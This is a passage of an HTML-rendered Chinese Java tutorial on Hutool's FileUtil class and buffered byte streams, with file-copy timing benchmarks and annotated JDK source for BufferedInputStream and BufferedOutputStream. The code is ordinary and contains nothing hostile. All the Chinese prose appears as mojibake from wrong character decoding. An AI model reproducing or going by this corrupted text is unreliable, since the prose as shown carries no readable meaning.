class="comment">// è·å–æ–‡ä»¶æˆ–ç›®å½•çš„å¤§å°</span></span><br><span class="line"><span class="type">long</span> <span class="variable">size</span> <span class="operator">=</span> FileUtils.sizeOf(file);</span><br><span class="line"><span class="comment">// è·å–æ–‡ä»¶æˆ–ç›®å½•çš„æ‰©å±•å</span></span><br><span class="line"><span class="type">String</span> <span class="variable">extension</span> <span class="operator">=</span> FileUtils.getExtension(file.getName());</span><br></pre></td></tr></table></figure><h3 id="Hutool-FileUtil-ç±»"><a href="#Hutool-FileUtil-ç±»" class="headerlink" title="Hutool FileUtil ç±»"></a>Hutool FileUtil ç±»</h3><p>FileUtil ç±»æ˜¯ <a href="https://hutool.cn/">Hutool</a> å·¥å…·åŒ…ä¸­çš„æ–‡ä»¶æ“ä½œå·¥å…·ç±»ï¼Œæä¾›äº†ä¸€ç³»åˆ—ç®€å•æ˜“ç”¨çš„æ–‡ä»¶æ“ä½œæ–¹æ³•ï¼Œå¯ä»¥å¸®åŠ© Java å¼€å‘è€…å¿«é€Ÿå®Œæˆæ–‡ä»¶ç›¸å…³çš„æ“ä½œä»»åŠ¡ã€‚</p><p>FileUtil ç±»åŒ…å«ä»¥ä¸‹å‡ ç±»æ“ä½œå·¥å…·ï¼š</p><ul><li>æ–‡ä»¶æ“ä½œï¼šåŒ…æ‹¬æ–‡ä»¶ç›®å½•çš„æ–°å»ºã€åˆ é™¤ã€å¤åˆ¶ã€ç§»åŠ¨ã€æ”¹åç­‰</li><li>æ–‡ä»¶åˆ¤æ–­ï¼šåˆ¤æ–­æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦éç©ºï¼Œæ˜¯å¦ä¸ºç›®å½•ï¼Œæ˜¯å¦ä¸ºæ–‡ä»¶ç­‰ç­‰ã€‚</li><li>ç»å¯¹è·¯å¾„ï¼šé’ˆå¯¹ ClassPath ä¸­çš„æ–‡ä»¶è½¬æ¢ä¸ºç»å¯¹è·¯å¾„æ–‡ä»¶ã€‚</li><li>æ–‡ä»¶åï¼šä¸»æ–‡ä»¶åï¼Œæ‰©å±•åçš„è·å–</li><li>è¯»æ“ä½œï¼šåŒ…æ‹¬ getReaderã€readXXX æ“ä½œ</li><li>å†™æ“ä½œï¼šåŒ…æ‹¬ getWriterã€writeXXX æ“ä½œ</li></ul><p>ä¸‹é¢æ˜¯ FileUtil ç±»ä¸­ä¸€äº›å¸¸ç”¨çš„æ–¹æ³•ï¼š</p><p>1ã€copyFileï¼šå¤åˆ¶æ–‡ä»¶ã€‚è¯¥æ–¹æ³•å¯ä»¥å°†æŒ‡å®šçš„æºæ–‡ä»¶å¤åˆ¶åˆ°æŒ‡å®šçš„ç›®æ ‡æ–‡ä»¶ä¸­ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">dest</span> <span class="operator">=</span> FileUtil.file(<span class="string">&quot;FileUtilDemo2.java&quot;</span>);</span><br><span class="line">FileUtil.copyFile(file, dest);</span><br></pre></td></tr></table></figure><p>2ã€moveï¼šç§»åŠ¨æ–‡ä»¶æˆ–ç›®å½•ã€‚è¯¥æ–¹æ³•å¯ä»¥å°†æŒ‡å®šçš„æºæ–‡ä»¶æˆ–ç›®å½•ç§»åŠ¨åˆ°æŒ‡å®šçš„ç›®æ ‡æ–‡ä»¶æˆ–ç›®å½•ä¸­ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FileUtil.move(file, dest, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>3ã€delï¼šåˆ é™¤æ–‡ä»¶æˆ–ç›®å½•ã€‚è¯¥æ–¹æ³•å¯ä»¥åˆ é™¤æŒ‡å®šçš„æ–‡ä»¶æˆ–ç›®å½•ï¼Œå¦‚æœæŒ‡å®šçš„æ–‡ä»¶æˆ–ç›®å½•ä¸å­˜åœ¨ï¼Œåˆ™ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FileUtil.del(file);</span><br></pre></td></tr></table></figure><p>4ã€renameï¼šé‡å‘½åæ–‡ä»¶æˆ–ç›®å½•ã€‚è¯¥æ–¹æ³•å¯ä»¥å°†æŒ‡å®šçš„æ–‡ä»¶æˆ–ç›®å½•é‡å‘½åä¸ºæŒ‡å®šçš„æ–°åç§°ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FileUtil.rename(file, <span class="string">&quot;FileUtilDemo3.java&quot;</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>5ã€readLinesï¼šä»æ–‡ä»¶ä¸­è¯»å–æ¯ä¸€è¡Œæ•°æ®ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FileUtil.readLines(file, <span class="string">&quot;UTF-8&quot;</span>).forEach(System.out::println);</span><br></pre></td></tr></table></figure><h2 id="Java-ç¼“å†²æµ"><a href="#Java-ç¼“å†²æµ" class="headerlink" title="Java ç¼“å†²æµ"></a>Java ç¼“å†²æµ</h2><p>Java çš„ç¼“å†²æµæ˜¯å¯¹å­—èŠ‚æµå’Œå­—ç¬¦æµçš„ä¸€ç§å°è£…ï¼Œé€šè¿‡åœ¨å†…å­˜ä¸­å¼€è¾Ÿç¼“å†²åŒºæ¥æé«˜ I&#x2F;O æ“ä½œçš„æ•ˆç‡ã€‚Java é€šè¿‡ BufferedInputStream å’Œ BufferedOutputStream æ¥å®ç°å­—èŠ‚æµçš„ç¼“å†²ï¼Œé€šè¿‡ BufferedReader å’Œ BufferedWriter æ¥å®ç°å­—ç¬¦æµçš„ç¼“å†²ã€‚</p><p>ç¼“å†²æµçš„å·¥ä½œåŸç†æ˜¯å°†æ•°æ®å…ˆå†™å…¥ç¼“å†²åŒºä¸­ï¼Œå½“ç¼“å†²åŒºæ»¡æ—¶å†ä¸€æ¬¡æ€§å†™å…¥æ–‡ä»¶æˆ–è¾“å‡ºæµï¼Œæˆ–è€…å½“ç¼“å†²åŒºä¸ºç©ºæ—¶ä¸€æ¬¡æ€§ä»æ–‡ä»¶æˆ–è¾“å…¥æµä¸­è¯»å–ä¸€å®šé‡çš„æ•°æ®ã€‚è¿™æ ·å¯ä»¥å‡å°‘ç³»ç»Ÿçš„ I&#x2F;O æ“ä½œæ¬¡æ•°ï¼Œæé«˜ç³»ç»Ÿçš„ I&#x2F;O æ•ˆç‡ï¼Œä»è€Œæé«˜ç¨‹åºçš„è¿è¡Œæ•ˆç‡ã€‚</p><h3 id="å­—èŠ‚ç¼“å†²æµ"><a href="#å­—èŠ‚ç¼“å†²æµ" class="headerlink" title="å­—èŠ‚ç¼“å†²æµ"></a>å­—èŠ‚ç¼“å†²æµ</h3><p>BufferedInputStream å’Œ BufferedOutputStream å±äºå­—èŠ‚ç¼“å†²æµï¼Œå¼ºåŒ–äº†å­—èŠ‚æµ InputStream å’Œ OutputStreamï¼Œå…³äºå­—èŠ‚æµï¼Œæˆ‘ä»¬å‰é¢å·²ç»è¯¦ç»†åœ°è®²è¿‡äº†ï¼Œå¯ä»¥<a href="https://javabetter.cn/io/stream.html">æˆ³è¿™ä¸ªé“¾æ¥</a>å»æ¸©ä¹ ã€‚</p><h4 id="1ï¼‰æ„é€ æ–¹æ³•"><a href="#1ï¼‰æ„é€ æ–¹æ³•" class="headerlink" title="1ï¼‰æ„é€ æ–¹æ³•"></a>1ï¼‰æ„é€ æ–¹æ³•</h4><ul><li><code>BufferedInputStream(InputStream in)</code> ï¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ç¼“å†²è¾“å…¥æµï¼Œæ³¨æ„å‚æ•°ç±»å‹ä¸º<strong>InputStream</strong>ã€‚</li><li><code>BufferedOutputStream(OutputStream out)</code>ï¼š åˆ›å»ºä¸€ä¸ªæ–°çš„ç¼“å†²è¾“å‡ºæµï¼Œæ³¨æ„å‚æ•°ç±»å‹ä¸º<strong>OutputStream</strong>ã€‚</li></ul><p>ä»£ç ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºå­—èŠ‚ç¼“å†²è¾“å…¥æµï¼Œå…ˆå£°æ˜å­—èŠ‚æµ</span></span><br><span class="line"><span class="type">FileInputStream</span> <span class="variable">fps</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(b.txt);</span><br><span class="line"><span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(fps)</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºå­—èŠ‚ç¼“å†²è¾“å…¥æµï¼ˆä¸€æ­¥åˆ°ä½ï¼‰</span></span><br><span class="line"><span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;b.txt&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºå­—èŠ‚ç¼“å†²è¾“å‡ºæµï¼ˆä¸€æ­¥åˆ°ä½ï¼‰</span></span><br><span class="line"><span class="type">BufferedOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;b.txt&quot;</span>));</span><br></pre></td></tr></table></figure><h4 id="2ï¼‰ç¼“å†²æµçš„é«˜æ•ˆ"><a href="#2ï¼‰ç¼“å†²æµçš„é«˜æ•ˆ" class="headerlink" title="2ï¼‰ç¼“å†²æµçš„é«˜æ•ˆ"></a>2ï¼‰ç¼“å†²æµçš„é«˜æ•ˆ</h4><p>æˆ‘ä»¬é€šè¿‡å¤åˆ¶ä¸€ä¸ª 370M+ çš„å¤§æ–‡ä»¶ï¼Œæ¥æµ‹è¯•ç¼“å†²æµçš„æ•ˆç‡ã€‚ä¸ºäº†åšå¯¹æ¯”ï¼Œæˆ‘ä»¬å…ˆç”¨åŸºæœ¬æµæ¥å®ç°ä¸€ä¸‹ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è®°å½•å¼€å§‹æ—¶é—´</span></span><br><span class="line"><span class="type">long</span> <span class="variable">start</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line"><span class="comment">// åˆ›å»ºæµå¯¹è±¡</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;py.mp4&quot;</span>);<span class="comment">//exeæ–‡ä»¶å¤Ÿå¤§</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;copyPy.mp4&quot;</span>))&#123;</span><br><span class="line">    <span class="comment">// è¯»å†™æ•°æ®</span></span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">    <span class="keyword">while</span> ((b = fis.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">        fos.write(b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è®°å½•ç»“æŸæ—¶é—´</span></span><br><span class="line"><span class="type">long</span> <span class="variable">end</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">System.out.println(<span class="string">&quot;æ™®é€šæµå¤åˆ¶æ—¶é—´:&quot;</span>+(end - start)+<span class="string">&quot; æ¯«ç§’&quot;</span>);</span><br></pre></td></tr></table></figure><p>ä¸å¥½æ„æ€ï¼Œæˆ‘æœ¬æœºæ¯”è¾ƒèœï¼Œ10 åˆ†é’Ÿè¿˜åœ¨å¤åˆ¶ä¸­ã€‚åˆ‡æ¢åˆ°ç¼“å†²æµè¯•ä¸€ä¸‹ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è®°å½•å¼€å§‹æ—¶é—´</span></span><br><span class="line"><span class="type">long</span> <span class="variable">start</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line"><span class="comment">// åˆ›å»ºæµå¯¹è±¡</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;py.mp4&quot;</span>));</span><br><span class="line">        <span class="type">BufferedOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;copyPy.mp4&quot;</span>));)&#123;</span><br><span class="line">    <span class="comment">// è¯»å†™æ•°æ®</span></span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">    <span class="keyword">while</span> ((b = bis.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">        bos.write(b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è®°å½•ç»“æŸæ—¶é—´</span></span><br><span class="line"><span class="type">long</span> <span class="variable">end</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">System.out.println(<span class="string">&quot;ç¼“å†²æµå¤åˆ¶æ—¶é—´:&quot;</span>+(end - start)+<span class="string">&quot; æ¯«ç§’&quot;</span>);</span><br></pre></td></tr></table></figure><p>åªéœ€è¦ 8016 æ¯«ç§’ï¼Œå¦‚ä½•æ›´å¿«å‘¢ï¼Ÿ</p><p>å¯ä»¥æ¢æ•°ç»„çš„æ–¹å¼æ¥è¯»å†™ï¼Œè¿™ä¸ªæˆ‘ä»¬å‰é¢ä¹Ÿæœ‰è®²åˆ°ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è®°å½•å¼€å§‹æ—¶é—´</span></span><br><span class="line"><span class="type">long</span> <span class="variable">start</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line"><span class="comment">// åˆ›å»ºæµå¯¹è±¡</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;py.mp4&quot;</span>));</span><br><span class="line">        <span class="type">BufferedOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;copyPy.mp4&quot;</span>));)&#123;</span><br><span class="line">    <span class="comment">// è¯»å†™æ•°æ®</span></span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8</span>*<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">while</span> ((len = bis.read(bytes)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        bos.write(bytes, <span class="number">0</span> , len);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è®°å½•ç»“æŸæ—¶é—´</span></span><br><span class="line"><span class="type">long</span> <span class="variable">end</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">System.out.println(<span class="string">&quot;ç¼“å†²æµä½¿ç”¨æ•°ç»„å¤åˆ¶æ—¶é—´:&quot;</span>+(end - start)+<span class="string">&quot; æ¯«ç§’&quot;</span>);</span><br></pre></td></tr></table></figure><p>è¿™ä¸‹å°±æ›´å¿«äº†ï¼Œåªéœ€è¦ 521 æ¯«ç§’ã€‚</p><h4 id="3ï¼‰ä¸ºä»€ä¹ˆå­—èŠ‚ç¼“å†²æµä¼šè¿™ä¹ˆå¿«ï¼Ÿ"><a href="#3ï¼‰ä¸ºä»€ä¹ˆå­—èŠ‚ç¼“å†²æµä¼šè¿™ä¹ˆå¿«ï¼Ÿ" class="headerlink" title="3ï¼‰ä¸ºä»€ä¹ˆå­—èŠ‚ç¼“å†²æµä¼šè¿™ä¹ˆå¿«ï¼Ÿ"></a>3ï¼‰ä¸ºä»€ä¹ˆå­—èŠ‚ç¼“å†²æµä¼šè¿™ä¹ˆå¿«ï¼Ÿ</h4><p>ä¼ ç»Ÿçš„ Java IO æ˜¯é˜»å¡æ¨¡å¼çš„ï¼Œå®ƒçš„å·¥ä½œçŠ¶æ€å°±æ˜¯â€œè¯»&#x2F;å†™ï¼Œç­‰å¾…ï¼Œè¯»&#x2F;å†™ï¼Œç­‰å¾…ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚â€</p><p>å­—èŠ‚ç¼“å†²æµè§£å†³çš„å°±æ˜¯è¿™ä¸ªé—®é¢˜ï¼š<strong>ä¸€æ¬¡å¤šè¯»ç‚¹å¤šå†™ç‚¹ï¼Œå‡å°‘è¯»å†™çš„é¢‘ç‡ï¼Œç”¨ç©ºé—´æ¢æ—¶é—´</strong>ã€‚</p><ul><li>å‡å°‘ç³»ç»Ÿè°ƒç”¨æ¬¡æ•°ï¼šåœ¨ä½¿ç”¨å­—èŠ‚ç¼“å†²æµæ—¶ï¼Œæ•°æ®ä¸æ˜¯ç«‹å³å†™å…¥ç£ç›˜æˆ–è¾“å‡ºæµï¼Œè€Œæ˜¯å…ˆå†™å…¥ç¼“å†²åŒºï¼Œå½“ç¼“å†²åŒºæ»¡æ—¶å†ä¸€æ¬¡æ€§å†™å…¥ç£ç›˜æˆ–è¾“å‡ºæµã€‚è¿™æ ·å¯ä»¥å‡å°‘ç³»ç»Ÿè°ƒç”¨çš„æ¬¡æ•°ï¼Œä»è€Œæé«˜ I&#x2F;O æ“ä½œçš„æ•ˆç‡ã€‚</li><li>å‡å°‘ç£ç›˜è¯»å†™æ¬¡æ•°ï¼šåœ¨ä½¿ç”¨å­—èŠ‚ç¼“å†²æµæ—¶ï¼Œå½“éœ€è¦è¯»å–æ•°æ®æ—¶ï¼Œç¼“å†²æµä¼šå…ˆä»ç¼“å†²åŒºä¸­è¯»å–æ•°æ®ï¼Œå¦‚æœç¼“å†²åŒºä¸­æ²¡æœ‰è¶³å¤Ÿçš„æ•°æ®ï¼Œåˆ™ä¼šä¸€æ¬¡æ€§ä»ç£ç›˜æˆ–è¾“å…¥æµä¸­è¯»å–ä¸€å®šé‡çš„æ•°æ®ã€‚åŒæ ·åœ°ï¼Œå½“éœ€è¦å†™å…¥æ•°æ®æ—¶ï¼Œç¼“å†²æµä¼šå…ˆå°†æ•°æ®å†™å…¥ç¼“å†²åŒºï¼Œå¦‚æœç¼“å†²åŒºæ»¡äº†ï¼Œåˆ™ä¼šä¸€æ¬¡æ€§å°†ç¼“å†²åŒºä¸­çš„æ•°æ®å†™å…¥ç£ç›˜æˆ–è¾“å‡ºæµã€‚è¿™æ ·å¯ä»¥å‡å°‘ç£ç›˜è¯»å†™çš„æ¬¡æ•°ï¼Œä»è€Œæé«˜ I&#x2F;O æ“ä½œçš„æ•ˆç‡ã€‚</li><li>æé«˜æ•°æ®ä¼ è¾“æ•ˆç‡ï¼šåœ¨ä½¿ç”¨å­—èŠ‚ç¼“å†²æµæ—¶ï¼Œç”±äºæ•°æ®æ˜¯ä»¥å—çš„å½¢å¼è¿›è¡Œä¼ è¾“ï¼Œå› æ­¤å¯ä»¥å‡å°‘æ•°æ®ä¼ è¾“çš„æ¬¡æ•°ï¼Œä»è€Œæé«˜æ•°æ®ä¼ è¾“çš„æ•ˆç‡ã€‚</li></ul><p>æˆ‘ä»¬æ¥çœ‹ BufferedInputStream çš„ read æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">read</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (pos &gt;= count) &#123;     <span class="comment">// å¦‚æœå½“å‰ä½ç½®å·²ç»åˆ°è¾¾ç¼“å†²åŒºæœ«å°¾</span></span><br><span class="line">        fill();             <span class="comment">// å¡«å……ç¼“å†²åŒº</span></span><br><span class="line">        <span class="keyword">if</span> (pos &gt;= count)   <span class="comment">// å¦‚æœå¡«å……åä»ç„¶åˆ°è¾¾ç¼“å†²åŒºæœ«å°¾ï¼Œè¯´æ˜å·²ç»è¯»å–å®Œæ¯•</span></span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;      <span class="comment">// è¿”å› -1 è¡¨ç¤ºå·²ç»è¯»å–å®Œæ¯•</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> getBufIfOpen()[pos++] &amp; <span class="number">0xff</span>; <span class="comment">// è¿”å›å½“å‰ä½ç½®çš„å­—èŠ‚ï¼Œå¹¶å°†ä½ç½®åŠ  1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç ä¸»è¦æœ‰ä¸¤éƒ¨åˆ†ï¼š</p><ul><li><code>fill()</code>ï¼šè¯¥æ–¹æ³•ä¼šå°†ç¼“å†² buf å¡«æ»¡ã€‚</li><li><code>getBufIfOpen()[pos++] &amp; 0xff</code>ï¼šè¿”å›å½“å‰è¯»å–ä½ç½® pos å¤„çš„å­—èŠ‚ï¼ˆ<code>getBufIfOpen()</code>è¿”å›çš„æ˜¯ buffer æ•°ç»„ï¼Œæ˜¯ byte ç±»å‹ï¼‰ï¼Œå¹¶å°†å…¶ä¸ 0xff è¿›è¡Œä½ä¸è¿ç®—ã€‚è¿™é‡Œçš„ç›®çš„æ˜¯å°†è¯»å–åˆ°çš„å­—èŠ‚ b å½“åšæ— ç¬¦å·çš„å­—èŠ‚å¤„ç†ï¼Œå› ä¸º Java çš„ byte ç±»å‹æ˜¯æœ‰ç¬¦å·çš„ï¼Œè€Œå°† b ä¸ 0xff è¿›è¡Œä½ä¸è¿ç®—ï¼Œå°±å¯ä»¥å°†å…¶è½¬æ¢ä¸ºæ— ç¬¦å·çš„å­—èŠ‚ï¼Œå…¶èŒƒå›´ä¸º 0 åˆ° 255ã€‚</li></ul><blockquote><p>byte &amp; 0xFF æˆ‘ä»¬ä¸€ä¼šå†ç»†è®²ã€‚</p></blockquote><p>å†æ¥çœ‹ FileInputStream çš„ read æ–¹æ³•ï¼š</p><p><img src="https://cdn.tobebetterjavaer.com/stutymore/buffer-20230321154534.png"></p><p>åœ¨è¿™æ®µä»£ç ä¸­ï¼Œ<code>read0()</code> æ–¹æ³•æ˜¯ä¸€ä¸ª<a href="https://javabetter.cn/oo/native-method.html">æœ¬åœ°æ–¹æ³•</a>ï¼Œå®ƒçš„å®ç°æ˜¯ç”±åº•å±‚æ“ä½œç³»ç»Ÿæä¾›çš„ï¼Œå¹¶ä¸æ˜¯ Java è¯­è¨€å®ç°çš„ã€‚åœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿä¸Šï¼Œ<code>read0()</code> æ–¹æ³•çš„å®ç°å¯èƒ½ä¼šæœ‰æ‰€ä¸åŒï¼Œä½†æ˜¯å®ƒä»¬çš„åŠŸèƒ½éƒ½æ˜¯ç›¸åŒçš„ï¼Œéƒ½æ˜¯ç”¨äº<strong>è¯»å–ä¸€ä¸ªå­—èŠ‚</strong>ã€‚</p><p>å†æ¥çœ‹ä¸€ä¸‹ BufferedOutputStream çš„ <code>write(byte b[], int off, int len)</code> æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(<span class="type">byte</span> b[], <span class="type">int</span> off, <span class="type">int</span> len)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (len &gt;= buf.length) &#123;    <span class="comment">// å¦‚æœå†™å…¥çš„å­—èŠ‚æ•°å¤§äºç­‰äºç¼“å†²åŒºé•¿åº¦</span></span><br><span class="line">        <span class="comment">/* å¦‚æœè¯·æ±‚çš„é•¿åº¦è¶…è¿‡äº†è¾“å‡ºç¼“å†²åŒºçš„å¤§å°ï¼Œ</span></span><br><span class="line"><span class="comment">           å…ˆåˆ·æ–°ç¼“å†²åŒºï¼Œç„¶åç›´æ¥å°†æ•°æ®å†™å…¥ã€‚</span></span><br><span class="line"><span class="comment">           è¿™æ ·å¯ä»¥é¿å…ç¼“å†²æµçº§è”æ—¶çš„é—®é¢˜ã€‚*/</span></span><br><span class="line">        flushBuffer();          <span class="comment">// å…ˆåˆ·æ–°ç¼“å†²åŒº</span></span><br><span class="line">        out.write(b, off, len); <span class="comment">// ç›´æ¥å°†æ•°æ®å†™å…¥è¾“å‡ºæµ</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (len &gt; buf.length - count) &#123; <span class="comment">// å¦‚æœå†™å…¥çš„å­—èŠ‚æ•°å¤§äºç©ºä½™ç©ºé—´</span></span><br><span class="line">        flushBuffer();              <span class="comment">// å…ˆåˆ·æ–°ç¼“å†²åŒº</span></span><br><span class="line">    &#125;</span><br><span class="line">    System.arraycopy(b, off, buf, count, len); <span class="comment">// å°†æ•°æ®æ‹·è´åˆ°ç¼“å†²åŒºä¸­</span></span><br><span class="line">    count += len;                             <span class="comment">// æ›´æ–°è®¡æ•°å™¨</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œè¯¥æ–¹æ³•ä¼šæ£€æŸ¥å†™å…¥çš„å­—èŠ‚æ•°æ˜¯å¦å¤§äºç­‰äºç¼“å†²åŒºé•¿åº¦ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™å…ˆå°†ç¼“å†²åŒºä¸­çš„æ•°æ®åˆ·æ–°åˆ°ç£ç›˜ä¸­ï¼Œç„¶åç›´æ¥å°†æ•°æ®å†™å…¥è¾“å‡ºæµã€‚è¿™æ ·åšæ˜¯ä¸ºäº†é¿å…ç¼“å†²æµçº§è”æ—¶çš„é—®é¢˜ï¼Œå³ç¼“å†²åŒºçš„å¤§å°ä¸è¶³ä»¥å®¹çº³å†™å…¥çš„æ•°æ®æ—¶ï¼Œå¯èƒ½ä¼šå¼•å‘çº§è”åˆ·æ–°ï¼Œå¯¼è‡´æ•ˆç‡é™ä½ã€‚</p><blockquote><p>çº§è”é—®é¢˜ï¼ˆCascade Problemï¼‰æ˜¯æŒ‡åœ¨ä¸€ç»„ç¼“å†²æµï¼ˆBuffered 